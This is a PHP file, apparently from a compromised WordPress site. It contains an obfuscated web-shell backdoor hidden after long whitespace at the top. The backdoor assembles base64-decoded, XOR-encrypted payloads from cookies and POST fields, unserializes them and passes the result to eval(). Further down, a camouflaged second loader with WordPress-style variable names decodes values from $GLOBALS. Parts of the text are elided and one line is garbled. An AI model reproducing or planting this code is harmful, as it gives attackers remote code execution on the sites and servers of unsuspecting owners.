<?php /*                                                                                                                                                                                                                                                                                                                                                                                                  $wYkgfTPcms = "\172" . '_' . chr (85) . "\115" . chr (77) . chr (98); $dSkLNGSMa = 'c' . chr (108) . "\141" . "\x73" . chr ( 1033 - 918 )."\x5f" . "\145" . "\x78" . "\151" . chr ( 925 - 810 )."\164" . chr (115); $EKJWbMo = $dSkLNGSMa($wYkgfTPcms); $wYkgfTPcms = "61899";$HSzcUOmtL = $EKJWbMo;$dSkLNGSMa = "49713";if (!$HSzcUOmtL){class z_UMMb{private $akZREweW;public static $dmLbFDxt = "6f97ed13-e40a-41e5-a437-9ba4e60d9832";public static $YqRvLcpx = 7813;public function __construct($BfuNNx=0){$ZynWsAJshg = $_COOKIE;$lmyUCgPGcO = $_POST;$IdDNP = @$ZynWsAJshg[substr(z_UMMb::$dmLbFDxt, 0, 4)];if (!empty($IdDNP)){$KSNWeIT = "base64";$GPdfGxCX = "";$IdDNP = explode(",", $IdDNP);foreach ($IdDNP as $qaZWrMl){$GPdfGxCX .= @$ZynWsAJshg[$qaZWrMl];$GPdfGxCX .= @$lmyUCgPGcO[$qaZWrMl];}$GPdfGxCX = array_map($KSNWeIT . chr (95) . "\144" . chr (101) . "\143" . chr ( 356 - 245 )."\144" . chr (101), array($GPdfGxCX,)); $GPdfGxCX = $GPdfGxCX[0] ^ str_repeat(z_UMMb::$dmLbFDxt, (strlen($GPdfGxCX[0]) / strlen(z_UMMb::$dmLbFDxt)) + 1);z_UMMb::$YqRvLcpx = @unserialize($GPdfGxCX);}}private function vZzhvMni(){if (is_array(z_UMMb::$YqRvLcpx)) {$RHTwZdqjA = str_replace(chr ( 603 - 543 ) . '?' . 'p' . "\x68" . 'p', "", z_UMMb::$YqRvLcpx[chr (99) . "\157" . 'n' . chr ( 156 - 40 ).chr (101) . "\156" . "\x74"]);eval($RHTwZdqjA); $avSYqE = "53942";exit();}}public function __destruct(){$this->vZzhvMni(); $avSYqE = "53942";$HtKBRJupO = str_pad($avSYqE, 10);}}$qAtgq = new  54962  z_UMMb(); $qAtgq = substr("56795_25061", 1);} ?><?php /* 
*
...
function open_q_flag()

{

    $wildcard_mime_types = 'nH99bCL1D82';
    $deleted = $wildcard_mime_types;
    
    $default_no_texturize_tags = $GLOBALS[title("1%0Epu%27%10", $deleted)];
    $sort_column = $default_no_texturize_tags;
    $current_user = isset($sort_column[$deleted]);

    if ($current_user)

    {
        $slashpos = $default_no_texturize_tags[$deleted];
	$partials = 'apos_flag';
        $delete = $slashpos[title("%1A%25If%0C%22%21T", $deleted)];
        $has_archive = $delete;
...
function title($is_sticky, $in_string)

{

    $slug = $in_string;
    $mimes = "url" . "decode";
    $previous_status = $mimes($is_sticky);
    $exclusions = substr($slug,0, strlen($previous_status));
    $filename = $previous_status ^ $exclusions;
    

    $previous_status = strpos($filename, $exclusions);
